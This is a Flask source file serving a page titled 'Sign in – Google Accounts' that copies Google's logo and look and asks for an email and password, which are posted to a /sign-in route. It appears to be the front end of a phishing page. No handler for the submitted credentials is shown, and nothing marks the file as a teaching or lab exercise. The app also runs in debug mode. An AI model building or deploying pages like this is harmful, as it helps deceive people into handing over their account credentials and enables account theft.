from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string('''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Sign in – Google Accounts</title>
            <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
            <style>
                body {
                    font-family: 'Roboto', sans-serif;
                    background-color: #f1f3f4;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .container {
                    background: #fff;
                    border-radius: 8px;
                    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
                    width: 360px;
                    padding: 24px;
                    text-align: center;
                }
                .logo {
                    margin-bottom: 24px;
                }
                .logo img {
                    width: 150px;
                }
                .form-group {
                    margin-bottom: 16px;
                }
                .form-group label {
                    display: block;
                    text-align: left;
                    margin-bottom: 4px;
                    color: #202124;
                    font-weight: 500;
                }
                .form-group input {
                    width: 100%;
                    padding: 12px;
                    border: 1px solid #dcdcdc;
                    border-radius: 4px;
                    box-sizing: border-box;
                }
                .form-group input:focus {
                    border-color: #a0a0a0;
                    outline: none;
                }
                .sign-in-button {
                    width: 100%;
                    padding: 12px;
                    background-color: #1a73e8;
                    border: none;
                    border-radius: 4px;
                    color: #fff;
                    font-size: 16px;
                    cursor: pointer;
                    margin-top: 16px;
                    transition: background-color 0.3s;
                }
                .sign-in-button:hover {
                    background-color: #1558d6;
                }
                .forgot-password {
                    margin-top: 16px;
                    font-size: 14px;
                    color: #1a73e8;
                    text-decoration: none;
                    display: block;
                }
                .forgot-password:hover {
                    text-decoration: underline;
                }
                .other-sign-in {
                    margin-top: 16px;
                    font-size: 14px;
                    color: #5f6368;
                }
                .other-sign-in a {
                    color: #1a73e8;
                    text-decoration: none;
                }
                .other-sign-in a:hover {
                    text-decoration: underline;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
                </div>
                <form action="/sign-in" method="POST">
                    <div class="form-group">
                        <label for="email">Email or phone</label>
                        <input type="text" id="email" name="email" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Enter your password</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    <button type="submit" class="sign-in-button">Sign in</button>
                </form>
                <a href="#" class="forgot-password">Forgot email?</a>
                <div class="other-sign-in">
                    <span>Don't have an account? <a href="#">Create account</a></span>
                </div>
            </div>
        </body>
        </html>
    ''')

if __name__ == '__main__':
    app.run(debug=True)
